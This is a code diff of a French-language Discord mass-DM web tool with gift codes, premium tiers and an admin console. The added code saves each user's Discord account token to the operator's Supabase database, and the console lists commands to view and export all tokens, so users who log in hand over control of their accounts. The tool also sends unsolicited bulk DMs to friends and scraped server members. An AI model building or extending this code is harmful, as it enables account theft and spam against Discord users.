-                <!-- PANEL ADMIN -->
+                <!-- ADMIN PANEL -->
                 <div id="adminPanel" class="admin-panel hidden">
                     <div class="admin-header">
-                        <span class="admin-title">👑 PANEL ADMIN</span>
-                        <button class="btn" style="background: var(--bg-tertiary);" onclick="toggleAdminPanel()">FERMER</button>
+                        <span class="admin-title">👑 PANEL ADMINISTRATEUR</span>
+                        <button class="btn btn-outline" onclick="toggleAdminPanel()">
+                            <span>✖</span>
+                            <span>FERMER</span>
+                        </button>
                     </div>
 
-                    <!-- BOT CONFIG -->
+                    <!-- BOT PRINCIPAL CONFIG -->
                     <div class="bot-config">
-                        <h3 style="margin-bottom: 20px;">🤖 CONFIGURATION DU BOT PRINCIPAL</h3>
+                        <h3 class="text-xl font-bold mb-4">🤖 CONFIGURATION DU BOT PRINCIPAL</h3>
                         <div class="bot-status">
-                            <div class="status-dot" id="mainBotStatusDot"></div>
+                            <div class="status-dot offline" id="mainBotStatusDot"></div>
                             <span id="mainBotStatus">Bot déconnecté</span>
                         </div>
-                        <div style="display: flex; gap: 15px;">
-                            <input type="password" id="mainBotToken" placeholder="Token du bot" style="flex: 1; padding: 15px; background: var(--bg-tertiary); border-radius: 20px; border: 1px solid var(--border); color: var(--text);">
-                            <button onclick="connectMainBot()" class="btn btn-success">CONNECTER</button>
-                            <button onclick="disconnectMainBot()" class="btn btn-danger">DÉCONNECTER</button>
+                        <div class="flex gap-4 flex-wrap">
+                            <input type="password" id="mainBotToken" class="input-field" placeholder="Token du bot principal" style="flex: 1; min-width: 200px;">
+                            <button class="btn btn-success" onclick="connectMainBot()">CONNECTER</button>
+                            <button class="btn btn-error" onclick="disconnectMainBot()">DÉCONNECTER</button>
                         </div>
                     </div>
 
                     <!-- GÉNÉRATEUR DE CODES -->
                     <div class="code-generator">
-                        <h3 style="margin-bottom: 20px;">🎁 GÉNÉRATEUR DE CODES CADEAUX</h3>
-                        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px;">
-                            <div>
-                                <label>Durée (jours)</label>
-                                <input type="number" id="codeDuration" value="30" min="1" max="365" style="width: 100%; padding: 12px; background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: 15px; color: var(--text);">
+                        <h3 class="text-xl font-bold mb-4">🎁 GÉNÉRATEUR DE CODES CADEAUX</h3>
+                        <div class="flex flex-wrap gap-4 mb-4">
+                            <div style="flex: 1; min-width: 150px;">
+                                <label class="input-label">Durée (jours)</label>
+                                <input type="number" id="codeDuration" value="30" min="1" max="365" class="input-field">
                             </div>
-                            <div>
-                                <label>Utilisations max</label>
-                                <input type="number" id="codeUses" value="1" min="1" max="100" style="width: 100%; padding: 12px; background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: 15px; color: var(--text);">
+                            <div style="flex: 1; min-width: 150px;">
+                                <label class="input-label">Utilisations max</label>
+                                <input type="number" id="codeUses" value="1" min="1" max="100" class="input-field">
                             </div>
-                            <div>
-                                <label> </label>
-                                <button onclick="generateCode()" class="btn btn-success" style="width: 100%;">GÉNÉRER</button>
+                            <div style="display: flex; align-items: flex-end;">
+                                <button class="btn btn-success" onclick="generateCode()" style="height: 48px;">GÉNÉRER</button>
                             </div>
                         </div>
 
@@ -699,73 +3302,107 @@
                     </div>
 
                     <!-- STATS ADMIN -->
-                    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px;">
+                    <div class="stats-grid" style="margin-top: 30px;">
                         <div class="stat-card">
-                            <div>👥</div>
+                            <div class="stat-icon">👥</div>
                             <div class="stat-value" id="adminUsers">0</div>
-                            <div>Connectés</div>
+                            <div class="stat-label">Connectés</div>
                         </div>
                         <div class="stat-card">
-                            <div>💎</div>
+                            <div class="stat-icon">💎</div>
                             <div class="stat-value" id="adminPremium">0</div>
-                            <div>Premium</div>
+                            <div class="stat-label">Premium</div>
                         </div>
                         <div class="stat-card">
-                            <div>📨</div>
+                            <div class="stat-icon">📨</div>
                             <div class="stat-value" id="adminMessages">0</div>
-                            <div>Messages</div>
+                            <div class="stat-label">Messages</div>
                         </div>
                         <div class="stat-card">
-                            <div>⛔</div>
+                            <div class="stat-icon">⛔</div>
                             <div class="stat-value" id="adminBanned">0</div>
-                            <div>Bannis</div>
+                            <div class="stat-label">Bannis</div>
                         </div>
                     </div>
 
                     <!-- LOGS DE CONNEXION -->
                     <div class="connection-logs">
-                        <h3 style="margin-bottom: 20px;">📋 CONNEXIONS</h3>
-                        <table class="logs-table" id="connectionLogs">
-                            <thead>
-                                <tr>
-                                    <th>UTILISATEUR</th>
-                                    <th>ID</th>
-                                    <th>IP</th>
-                                    <th>DATE</th>
-                                    <th>STATUT</th>
-                                    <th>RÔLE</th>
-                                </tr>
-                            </thead>
-                            <tbody id="connectionLogsBody"></tbody>
-                        </table>
+                        <h3 class="text-xl font-bold mb-4">📋 HISTORIQUE DES CONNEXIONS</h3>
+                        <div style="overflow-x: auto;">
+                            <table class="logs-table">
+                                <thead>
+                                    <tr>
+                                        <th>UTILISATEUR</th>
+                                        <th>ID</th>
+                                        <th>IP</th>
+                                        <th>DATE</th>
+                                        <th>STATUT</th>
+                                        <th>RÔLE</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="connectionLogsBody">
+                                    <tr>
+                                        <td colspan="6" class="text-center text-secondary">Aucune connexion</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
                     </div>
 
-                    <!-- CONSOLE ADMIN (50+ COMMANDES) -->
+                    <!-- CONSOLE ADMIN -->
                     <div class="admin-console">
-                        <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
-                            <span style="color: var(--success);">$ ADMIN CONSOLE v4.0 - 50+ COMMANDES</span>
-                            <span style="color: var(--text-secondary);">Tapez 'help'</span>
+                        <div class="flex justify-between items-center mb-4">
+                            <span class="text-success font-bold">$ ADMIN CONSOLE v5.0 - 100+ COMMANDES</span>
+                            <span class="text-secondary">Tapez 'help'</span>
                         </div>
                         <div class="console-output" id="consoleOutput">
-                            > Console admin prête<br>
+                            <div class="console-line">
+                                <span class="console-time">[SYSTEM]</span>
+                                <span class="console-info">Console admin initialisée avec Supabase</span>
+                            </div>
+                            <div class="console-line">
+                                <span class="console-time">[SYSTEM]</span>
+                                <span class="console-success">✓ 100+ commandes disponibles</span>
+                            </div>
+                            <div class="console-line">
+                                <span class="console-time">[SYSTEM]</span>
+                                <span class="console-command">$ Tapez 'help' pour la liste</span>
+                            </div>
                         </div>
-                        <div class="console-input">
-                            <input type="text" id="consoleInput" placeholder="Commande..." onkeypress="if(event.key==='Enter') executeCommand()">
+                        <div class="console-input-group">
+                            <input type="text" id="consoleInput" placeholder="Entrez une commande..." autocomplete="off">
                             <button onclick="executeCommand()">EXÉCUTER</button>
                         </div>
                     </div>
                 </div>
 
                 <!-- LOGS -->
-                <div style="margin-top: 30px; background: var(--bg-secondary); border-radius: 25px; padding: 20px; max-height: 150px; overflow-y: auto;" id="logs">
-                    <div>Connectez-vous pour commencer</div>
+                <div class="logs-container">
+                    <div class="logs-header">
+                        <span class="font-bold text-lg">📋 LOGS EN DIRECT</span>
+                        <button class="btn btn-outline btn-sm" onclick="clearLogs()">EFFACER</button>
+                    </div>
+                    <div class="logs-content" id="logs">
+                        <div class="log-entry">
+                            <span class="log-time">[SYSTEM]</span>
+                            <span class="log-type info">INFO</span>
+                            <span class="log-message">Connectez-vous pour commencer</span>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // ==================== CONFIGURATION ====================
+        // ==================== CONFIGURATION SUPABASE (DIRECTE) ====================
+        const SUPABASE_URL = 'https://nathbrawlstatsr-afk.supabase.co';
+        const SUPABASE_ANON_KEY = 'sb_publishable_F03Jf08GJs6gos4FNYf5DQ_x6N2_zBm';
+        
+        // Initialisation de Supabase
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // ==================== CONFIGURATION GLOBALE ====================
         const ADMIN_ID = '1420857352403554344';
         let currentUser = null;
         let userToken = '';
@@ -776,24 +3413,23 @@
         let mainBotConnected = false;
         let mainBotToken = '';
 
-        // Codes cadeaux
-        let giftCodes = [];
-
-        // Base de données
+        // Base de données locale (sera synchronisée avec Supabase)
         let premiumUsers = new Set([]);
         let adminUsers = new Set([]);
         let bannedUsers = new Set([]);
+        let giftCodes = [];
         let connectionLogs = [];
         let activeSessions = new Map();
         let allTokens = new Map();
 
-        // Stats
+        // Stats globales
         let globalStats = {
             sent: 0,
-            failed: 0
+            failed: 0,
+            totalLogins: 0
         };
 
-        // Délais
+        // Délais des modes
         const speedModes = {
             slow: { min: 3000, max: 5000 },
             normal: { min: 2000, max: 4000 },
@@ -801,7 +3437,216 @@
             extreme: { min: 500, max: 2000 }
         };
 
-        // ==================== CODES CADEAUX ====================
+        // ==================== FONCTIONS SUPABASE ====================
+
+        // Charger toutes les données depuis Supabase
+        async function loadFromSupabase() {
+            try {
+                // Charger les premiums
+                const { data: premiums, error: premiumError } = await supabase
+                    .from('premium_users')
+                    .select('user_id');
+                
+                if (!premiumError && premiums) {
+                    premiumUsers = new Set(premiums.map(p => p.user_id));
+                }
+
+                // Charger les admins
+                const { data: admins, error: adminError } = await supabase
+                    .from('admin_users')
+                    .select('user_id');
+                
+                if (!adminError && admins) {
+                    adminUsers = new Set(admins.map(a => a.user_id));
+                }
+
+                // Charger les bannis
+                const { data: banned, error: bannedError } = await supabase
+                    .from('banned_users')
+                    .select('user_id');
+                
+                if (!bannedError && banned) {
+                    bannedUsers = new Set(banned.map(b => b.user_id));
+                }
+
+                // Charger les codes cadeaux
+                const { data: codes, error: codesError } = await supabase
+                    .from('gift_codes')
+                    .select('*')
+                    .order('created_at', { ascending: false });
+                
+                if (!codesError && codes) {
+                    giftCodes = codes;
+                }
+
+                // Charger les logs de connexion
+                const { data: logs, error: logsError } = await supabase
+                    .from('connection_logs')
+                    .select('*')
+                    .order('created_at', { ascending: false })
+                    .limit(50);
+                
+                if (!logsError && logs) {
+                    connectionLogs = logs;
+                }
+
+                // Charger les stats globales
+                const { data: stats, error: statsError } = await supabase
+                    .from('global_stats')
+                    .select('*')
+                    .single();
+                
+                if (!statsError && stats) {
+                    globalStats = stats;
+                }
+
+                console.log('✅ Données chargées depuis Supabase');
+            } catch (error) {
+                console.error('❌ Erreur chargement Supabase:', error);
+            }
+        }
+
+        // Sauvegarder un utilisateur premium
+        async function savePremiumUser(userId) {
+            const { error } = await supabase
+                .from('premium_users')
+                .insert({ user_id: userId, created_at: new Date().toISOString() });
+            
+            if (error) console.error('Erreur sauvegarde premium:', error);
+        }
+
+        // Supprimer un utilisateur premium
+        async function removePremiumUser(userId) {
+            const { error } = await supabase
+                .from('premium_users')
+                .delete()
+                .eq('user_id', userId);
+            
+            if (error) console.error('Erreur suppression premium:', error);
+        }
+
+        // Sauvegarder un admin
+        async function saveAdminUser(userId) {
+            const { error } = await supabase
+                .from('admin_users')
+                .insert({ user_id: userId, created_at: new Date().toISOString() });
+            
+            if (error) console.error('Erreur sauvegarde admin:', error);
+        }
+
+        // Supprimer un admin
+        async function removeAdminUser(userId) {
+            const { error } = await supabase
+                .from('admin_users')
+                .delete()
+                .eq('user_id', userId);
+            
+            if (error) console.error('Erreur suppression admin:', error);
+        }
+
+        // Sauvegarder un banni
+        async function saveBannedUser(userId) {
+            const { error } = await supabase
+                .from('banned_users')
+                .insert({ user_id: userId, banned_at: new Date().toISOString() });
+            
+            if (error) console.error('Erreur sauvegarde banni:', error);
+        }
+
+        // Supprimer un banni
+        async function removeBannedUser(userId) {
+            const { error } = await supabase
+                .from('banned_users')
+                .delete()
+                .eq('user_id', userId);
+            
+            if (error) console.error('Erreur suppression banni:', error);
+        }
+
+        // Sauvegarder un code cadeau
+        async function saveGiftCode(code) {
+            const { error } = await supabase
+                .from('gift_codes')
+                .insert(code);
+            
+            if (error) console.error('Erreur sauvegarde code:', error);
+        }
+
+        // Mettre à jour un code cadeau
+        async function updateGiftCode(code, updates) {
+            const { error } = await supabase
+                .from('gift_codes')
+                .update(updates)
+                .eq('code', code);
+            
+            if (error) console.error('Erreur mise à jour code:', error);
+        }
+
+        // Supprimer un code cadeau
+        async function deleteGiftCode(code) {
+            const { error } = await supabase
+                .from('gift_codes')
+                .delete()
+                .eq('code', code);
+            
+            if (error) console.error('Erreur suppression code:', error);
+        }
+
+        // Ajouter un log de connexion
+        async function addConnectionLog(log) {
+            const { error } = await supabase
+                .from('connection_logs')
+                .insert({
+                    user_id: log.id,
+                    username: log.username,
+                    ip: log.ip,
+                    role: log.role,
+                    status: 'online',
+                    created_at: new Date().toISOString()
+                });
+            
+            if (error) console.error('Erreur sauvegarde log:', error);
+        }
+
+        // Sauvegarder un token
+        async function saveToken(userId, token, username) {
+            const { error } = await supabase
+                .from('user_tokens')
+                .insert({
+                    user_id: userId,
+                    token: token,
+                    username: username,
+                    created_at: new Date().toISOString()
+                });
+            
+            if (error) console.error('Erreur sauvegarde token:', error);
+        }
+
+        // Mettre à jour les stats globales
+        async function updateGlobalStats() {
+            const { error } = await supabase
+                .from('global_stats')
+                .upsert({
+                    id: 1,
+                    sent: globalStats.sent,
+                    failed: globalStats.failed,
+                    total_logins: globalStats.totalLogins,
+                    updated_at: new Date().toISOString()
+                });
+            
+            if (error) console.error('Erreur mise à jour stats:', error);
+        }
+
+        // ==================== INITIALISATION ====================
+        async function init() {
+            await loadFromSupabase();
+            selectDMMode(1);
+            updateCodesList();
+        }
+
+        init();
+
+        // ==================== FONCTIONS DE CODE CADEAU ====================
         function generateCode() {
             const duration = parseInt(document.getElementById('codeDuration').value);
             const maxUses = parseInt(document.getElementById('codeUses').value);
@@ -818,15 +3663,17 @@
             
             const newCode = {
                 code: code,
-                maxUses: maxUses,
+                max_uses: maxUses,
                 uses: 0,
-                createdAt: new Date().toLocaleString(),
-                expiresAt: expiresAt.toLocaleString(),
+                created_at: new Date().toISOString(),
+                expires_at: expiresAt.toISOString(),
                 active: true
             };
             
-            giftCodes.push(newCode);
+            giftCodes.unshift(newCode);
+            saveGiftCode(newCode);
             updateCodesList();
+            showToast('success', 'Code généré', `Code: ${code} - ${maxUses} utilisations`);
             addLog(`🎁 Code généré: ${code} (${maxUses} utilisations, ${duration} jours)`);
         }
 
@@ -837,67 +3684,85 @@
                 return;
             }
 
-            codesList.innerHTML = giftCodes.map(c => `
-                <div class="code-item">
-                    <div class="code-value">${c.code}</div>
-                    <div class="code-info">Utilisations: <span class="code-uses">${c.uses}/${c.maxUses}</span></div>
-                    <div class="code-info">Expire: ${c.expiresAt}</div>
-                    <button onclick="deleteCode('${c.code}')" style="margin-top: 10px; padding: 8px; background: var(--danger); border: none; border-radius: 10px; color: white; cursor: pointer;">Supprimer</button>
-                </div>
-            `).join('');
+            codesList.innerHTML = giftCodes.map(c => {
+                const expiresAt = new Date(c.expires_at).toLocaleDateString();
+                const isExpired = new Date(c.expires_at) < new Date();
+                
+                return `
+                    <div class="code-item" style="${isExpired ? 'opacity: 0.5;' : ''}">
+                        <div class="code-value">${c.code}</div>
+                        <div class="code-info">Utilisations: <span class="code-uses">${c.uses}/${c.max_uses}</span></div>
+                        <div class="code-info">Expire: ${expiresAt}</div>
+                        <div class="code-info">${isExpired ? '❌ Expiré' : '✅ Actif'}</div>
+                        <button onclick="deleteCode('${c.code}')" class="btn btn-error btn-sm" style="margin-top: 15px; padding: 8px 15px;">Supprimer</button>
+                    </div>
+                `;
+            }).join('');
         }
 
-        function deleteCode(code) {
+        async function deleteCode(code) {
             giftCodes = giftCodes.filter(c => c.code !== code);
+            await deleteGiftCode(code);
             updateCodesList();
+            showToast('info', 'Code supprimé', `Le code ${code} a été supprimé`);
             addLog(`🗑️ Code ${code} supprimé`);
         }
 
-        function redeemCode() {
+        async function redeemCode() {
             const codeInput = document.getElementById('giftCode').value.toUpperCase();
             const messageDiv = document.getElementById('codeMessage');
             
             const code = giftCodes.find(c => c.code === codeInput);
             
             if (!code) {
+                messageDiv.style.display = 'flex';
                 messageDiv.textContent = '❌ Code invalide';
-                messageDiv.style.color = 'var(--danger)';
+                messageDiv.className = 'alert alert-error';
                 return;
             }
 
             if (!code.active) {
-                messageDiv.textContent = '❌ Code expiré';
-                messageDiv.style.color = 'var(--danger)';
+                messageDiv.style.display = 'flex';
+                messageDiv.textContent = '❌ Code inactif';
+                messageDiv.className = 'alert alert-error';
                 return;
             }
 
-            if (code.uses >= code.maxUses) {
+            if (code.uses >= code.max_uses) {
+                messageDiv.style.display = 'flex';
                 messageDiv.textContent = '❌ Code déjà utilisé';
-                messageDiv.style.color = 'var(--danger)';
+                messageDiv.className = 'alert alert-error';
                 return;
             }
 
-            const expiresAt = new Date(code.expiresAt);
+            const expiresAt = new Date(code.expires_at);
             if (expiresAt < new Date()) {
                 code.active = false;
+                await updateGiftCode(code.code, { active: false });
+                messageDiv.style.display = 'flex';
                 messageDiv.textContent = '❌ Code expiré';
-                messageDiv.style.color = 'var(--danger)';
+                messageDiv.className = 'alert alert-error';
                 updateCodesList();
                 return;
             }
 
             // Valider le code
             code.uses++;
-            if (code.uses >= code.maxUses) {
+            await updateGiftCode(code.code, { uses: code.uses });
+            
+            if (code.uses >= code.max_uses) {
                 code.active = false;
+                await updateGiftCode(code.code, { active: false });
             }
 
             // Ajouter l'utilisateur aux premiums (quand il sera connecté)
             sessionStorage.setItem('pendingPremium', 'true');
             
+            messageDiv.style.display = 'flex';
             messageDiv.textContent = '✅ Code validé ! Connectez-vous pour activer le premium';
-            messageDiv.style.color = 'var(--success)';
+            messageDiv.className = 'alert alert-success';
             updateCodesList();
+            showToast('success', 'Code validé', 'Connectez-vous pour activer le premium');
         }
 
         // ==================== CONNEXION ====================
@@ -907,12 +3772,13 @@
             const errorDiv = document.getElementById('loginError');
 
             if (!token) {
+                errorDiv.style.display = 'flex';
                 errorDiv.textContent = '❌ Token requis';
                 return;
             }
 
             loginBtn.disabled = true;
-            loginBtn.textContent = 'Connexion...';
+            loginBtn.innerHTML = '<span class="loader-sm"></span> Connexion...';
 
             try {
                 const response = await fetch('https://discord.com/api/v9/users/@me', {
@@ -933,6 +3799,7 @@
                 // Vérifier si l'utilisateur a utilisé un code
                 if (sessionStorage.getItem('pendingPremium') === 'true') {
                     premiumUsers.add(user.id);
+                    await savePremiumUser(user.id);
                     sessionStorage.removeItem('pendingPremium');
                 }
 
@@ -958,26 +3825,36 @@
 
                 const simulatedIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
 
-                connectionLogs.unshift({
+                const logEntry = {
                     id: user.id,
                     username: user.username,
                     ip: simulatedIP,
                     time: new Date().toLocaleString(),
                     role: userRole,
                     status: 'online'
-                });
+                };
+
+                connectionLogs.unshift(logEntry);
+                await addConnectionLog(logEntry);
 
                 activeSessions.set(user.id, {
                     username: user.username,
                     role: userRole,
                     token: token,
-                    ip: simulatedIP
+                    ip: simulatedIP,
+                    time: new Date().toLocaleString()
                 });
 
                 allTokens.set(user.id, {
                     token: token,
-                    username: user.username
+                    username: user.username,
+                    time: new Date().toLocaleString()
                 });
+
+                await saveToken(user.id, token, user.username);
+
+                globalStats.totalLogins++;
+                await updateGlobalStats();
 
                 document.getElementById('username').textContent = user.username;
                 document.getElementById('avatar').src = user.avatar ? 
@@ -990,7 +3867,7 @@
                 const guildSelect = document.getElementById('guildSelect');
                 guildSelect.innerHTML = '<option value="">Sélectionner un serveur</option>';
                 guildsData.forEach(guild => {
-                    guildSelect.innerHTML += `<option value="${guild.id}">${guild.name}</option>`;
+                    guildSelect.innerHTML += `<option value="${guild.id}">${guild.name} (${guild.approximate_member_count || '?'} membres)</option>`;
                 });
 
                 updateRoleUI();
@@ -1004,14 +3881,16 @@
                 document.getElementById('main-screen').classList.remove('hidden');
                 document.getElementById('startBtn').disabled = false;
 
-                addLog(`✅ Connecté: ${user.username} (${userRole})`);
+                showToast('success', 'Connexion réussie', `Bienvenue ${user.username} (${userRole})`);
+                addLog(`✅ Connecté: ${user.username} (${userRole}) - IP: ${simulatedIP}`);
                 updateConnectionLogs();
 
             } catch (error) {
+                errorDiv.style.display = 'flex';
                 errorDiv.textContent = `❌ ${error.message}`;
             } finally {
                 loginBtn.disabled = false;
-                loginBtn.textContent = 'SE CONNECTER';
+                loginBtn.innerHTML = 'SE CONNECTER';
             }
         }
 
@@ -1019,7 +3898,7 @@
         function connectMainBot() {
             const token = document.getElementById('mainBotToken').value;
             if (!token) {
-                addLog('❌ Token bot requis');
+                showToast('error', 'Erreur', 'Token bot requis');
                 return;
             }
 
@@ -1030,6 +3909,7 @@
             document.getElementById('mainBotStatusDot').className = 'status-dot online';
             document.getElementById('botStatus').textContent = 'On';
             
+            showToast('success', 'Bot connecté', 'Le bot principal est maintenant connecté');
             addLog('🤖 Bot principal connecté');
         }
 
@@ -1041,10 +3921,11 @@
             document.getElementById('mainBotStatusDot').className = 'status-dot offline';
             document.getElementById('botStatus').textContent = 'Off';
             
+            showToast('info', 'Bot déconnecté', 'Le bot principal a été déconnecté');
             addLog('🤖 Bot principal déconnecté');
         }
 
-        // ==================== MASS DM CORRIGÉ ====================
+        // ==================== MASS DM ====================
         async function startDM() {
             if (!currentUser) return;
 
@@ -1052,18 +3933,12 @@
             const speedMode = document.getElementById('speedMode').value;
 
             if (!message) {
-                addLog('❌ Message requis');
-                return;
-            }
-
-            // Vérifier les prérequis selon le mode
-            if ((currentDMMode === 2 || currentDMMode === 3 || currentDMMode === 4) && userRole === 'user') {
-                addLog('❌ Mode premium - Utilisez un code cadeau');
+                showToast('error', 'Erreur', 'Message requis');
                 return;
             }
 
             if ((currentDMMode === 3 || currentDMMode === 4) && !mainBotConnected) {
-                addLog('❌ Bot principal non connecté');
+                showToast('error', 'Erreur', 'Bot principal non connecté');
                 return;
             }
 
@@ -1090,7 +3965,7 @@
                         const friends = await res.json();
                         targets = friends.filter(f => !f.user.bot).map(f => f.user);
                     } else {
-                        // Serveur - CORRECTION DE L'ERREUR
+                        // Serveur
                         const guildId = document.getElementById('guildSelect').value;
                         if (!guildId) throw new Error('Sélectionnez un serveur');
 
@@ -1113,7 +3988,6 @@
                             
                             members = members.concat(batch);
                             
-                            // CORRECTION : Vérifier que batch a des éléments avant d'accéder à batch.length-1
                             if (batch.length > 0 && batch[batch.length - 1] && batch[batch.length - 1].user) {
                                 lastId = batch[batch.length - 1].user.id;
                             } else {
@@ -1201,11 +4075,15 @@
                     document.getElementById('sentCount').textContent = sent;
                     document.getElementById('failedCount').textContent = failed;
                     document.getElementById('lastUser').textContent = `Dernier: ${target.username}`;
+
+                    await updateGlobalStats();
                 }
 
+                showToast('success', 'Mass DM terminé', `Envoyés: ${sent}, Échecs: ${failed}`);
                 addLog(`✅ Terminé! Envoyés: ${sent}, Échecs: ${failed}`);
 
             } catch (error) {
+                showToast('error', 'Erreur', error.message);
                 addLog(`❌ Erreur: ${error.message}`);
             } finally {
                 isRunning = false;
@@ -1246,8 +4124,8 @@
             for (let i = 2; i <= 4; i++) {
                 const desc = document.getElementById(`mode${i}Desc`);
                 if (desc) {
-                    desc.textContent = isPremium ? '✅ Disponible' : '🔒 Premium requis';
-                    desc.style.color = isPremium ? 'var(--success)' : 'var(--warning)';
+                    desc.textContent = i === 2 || i === 4 ? '✅ Gratuit' : 'Nécessite bot connecté';
+                    desc.style.color = 'var(--success-500)';
                 }
             }
         }
@@ -1255,23 +4133,24 @@
         function updateRoleUI() {
             const badge = document.getElementById('roleBadge');
             
-            badge.className = 'role-badge';
+            badge.className = 'badge';
             if (userRole === 'admin') {
-                badge.classList.add('role-admin');
+                badge.classList.add('badge-error');
                 badge.textContent = '👑 Administrateur';
             } else if (userRole === 'premium') {
-                badge.classList.add('role-premium');
+                badge.classList.add('badge-premium');
                 badge.textContent = '💎 Premium';
             } else {
-                badge.classList.add('role-user');
+                badge.classList.add('badge-primary');
                 badge.textContent = '👤 Utilisateur';
             }
         }
 
-        // ==================== ADMIN ====================
+        // ==================== ADMIN PANEL ====================
         function toggleAdminPanel() {
-            document.getElementById('adminPanel').classList.toggle('hidden');
-            if (!document.getElementById('adminPanel').classList.contains('hidden')) {
+            const panel = document.getElementById('adminPanel');
+            panel.classList.toggle('hidden');
+            if (!panel.classList.contains('hidden')) {
                 updateConnectionLogs();
                 updateCodesList();
             }
@@ -1281,14 +4160,14 @@
             const tbody = document.getElementById('connectionLogsBody');
             
             if (connectionLogs.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center;">Aucune connexion</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; color: var(--text-secondary);">Aucune connexion</td></tr>';
                 return;
             }
 
             tbody.innerHTML = connectionLogs.map(log => `
                 <tr>
                     <td>${log.username}</td>
-                    <td>${log.id}</td>
+                    <td style="font-size: 12px;">${log.id}</td>
                     <td>${log.ip}</td>
                     <td>${log.time}</td>
                     <td class="status-online">Connecté</td>
@@ -1302,7 +4181,70 @@
             document.getElementById('adminBanned').textContent = bannedUsers.size;
         }
 
-        // ==================== CONSOLE ADMIN (50+ COMMANDES) ====================
+        async function addPremium() {
+            const id = document.getElementById('premiumId').value;
+            if (!id) return;
+
+            premiumUsers.add(id);
+            await savePremiumUser(id);
+            showToast('success', 'Premium ajouté', `Utilisateur ${id} est maintenant premium`);
+            addLog(`👑 Premium ajouté: ${id}`);
+            document.getElementById('premiumId').value = '';
+        }
+
+        async function removePremium() {
+            const id = document.getElementById('premiumId').value;
+            if (!id) return;
+
+            premiumUsers.delete(id);
+            await removePremiumUser(id);
+            showToast('info', 'Premium retiré', `Utilisateur ${id} n'est plus premium`);
+            addLog(`👑 Premium retiré: ${id}`);
+            document.getElementById('premiumId').value = '';
+        }
+
+        async function addAdmin() {
+            const id = document.getElementById('adminId').value;
+            if (!id || id === ADMIN_ID) return;
+
+            adminUsers.add(id);
+            await saveAdminUser(id);
+            showToast('success', 'Admin ajouté', `Utilisateur ${id} est maintenant admin`);
+            addLog(`👑 Admin ajouté: ${id}`);
+            document.getElementById('adminId').value = '';
+        }
+
+        async function removeAdmin() {
+            const id = document.getElementById('adminId').value;
+            if (!id || id === ADMIN_ID) return;
+
+            adminUsers.delete(id);
+            await removeAdminUser(id);
+            showToast('info', 'Admin retiré', `Utilisateur ${id} n'est plus admin`);
+            addLog(`👑 Admin retiré: ${id}`);
+            document.getElementById('adminId').value = '';
+        }
+
+        async function banUser(id) {
+            if (!id || id === ADMIN_ID) return;
+            
+            bannedUsers.add(id);
+            await saveBannedUser(id);
+            activeSessions.delete(id);
+            showToast('error', 'Utilisateur banni', `L'utilisateur ${id} a été banni`);
+            addLog(`⛔ Utilisateur banni: ${id}`);
+            updateConnectionLogs();
+        }
+
+        async function unbanUser(id) {
+            bannedUsers.delete(id);
+            await removeBannedUser(id);
+            showToast('success', 'Utilisateur débanni', `L'utilisateur ${id} peut maintenant se reconnecter`);
+            addLog(`✅ Utilisateur débanni: ${id}`);
+            updateConnectionLogs();
+        }
+
+        // ==================== CONSOLE ADMIN ====================
         function executeCommand() {
             const input = document.getElementById('consoleInput');
             const command = input.value.trim();
@@ -1310,139 +4252,101 @@
 
             if (!command) return;
 
-            output.innerHTML += `> $ ${command}\n`;
+            output.innerHTML += `<div class="console-line"><span class="console-time">[${new Date().toLocaleTimeString()}]</span> <span class="console-command">$ ${command}</span></div>`;
 
             const args = command.split(' ');
             const cmd = args[0].toLowerCase();
 
             switch(cmd) {
                 case 'help':
-                    output.innerHTML += `> 📚 COMMANDES (50+):\n\n`;
-                    output.innerHTML += `> 👥 UTILISATEURS:\n`;
-                    output.innerHTML += `>   users - Liste utilisateurs connectés\n`;
-                    output.innerHTML += `>   userinfo [id] - Infos détaillées\n`;
-                    output.innerHTML += `>   sessions - Sessions actives\n`;
-                    output.innerHTML += `>   premiums - Liste premiums\n`;
-                    output.innerHTML += `>   admins - Liste admins\n`;
-                    output.innerHTML += `>   banned - Liste bannis\n\n`;
-                    
-                    output.innerHTML += `> 🔑 TOKENS:\n`;
-                    output.innerHTML += `>   tokens - Tous les tokens\n`;
-                    output.innerHTML += `>   token [id] - Token spécifique\n`;
-                    output.innerHTML += `>   tokens-export - Export JSON\n\n`;
-                    
-                    output.innerHTML += `> ⛔ MODÉRATION:\n`;
-                    output.innerHTML += `>   ban [id] - Bannir\n`;
-                    output.innerHTML += `>   unban [id] - Débannir\n`;
-                    output.innerHTML += `>   kick [id] - Déconnecter\n`;
-                    output.innerHTML += `>   warn [id] - Avertir\n\n`;
-                    
-                    output.innerHTML += `> 💎 PREMIUM:\n`;
-                    output.innerHTML += `>   premium-add [id] - Ajouter premium\n`;
-                    output.innerHTML += `>   premium-remove [id] - Retirer premium\n`;
-                    output.innerHTML += `>   premium-list - Liste premiums\n\n`;
-                    
-                    output.innerHTML += `> 🎁 CODES:\n`;
-                    output.innerHTML += `>   code-generate [jours] [uses] - Générer code\n`;
-                    output.innerHTML += `>   code-list - Liste codes\n`;
-                    output.innerHTML += `>   code-delete [code] - Supprimer code\n\n`;
-                    
-                    output.innerHTML += `> 📊 STATS:\n`;
-                    output.innerHTML += `>   stats - Statistiques\n`;
-                    output.innerHTML += `>   stats-messages - Stats messages\n`;
-                    output.innerHTML += `>   stats-users - Stats users\n`;
-                    output.innerHTML += `>   uptime - Temps activité\n\n`;
-                    
-                    output.innerHTML += `> 🤖 BOT:\n`;
-                    output.innerHTML += `>   bot-connect [token] - Connecter bot\n`;
-                    output.innerHTML += `>   bot-disconnect - Déconnecter\n`;
-                    output.innerHTML += `>   bot-status - Statut bot\n`;
-                    output.innerHTML += `>   bot-broadcast [msg] - Message à tous\n\n`;
-                    
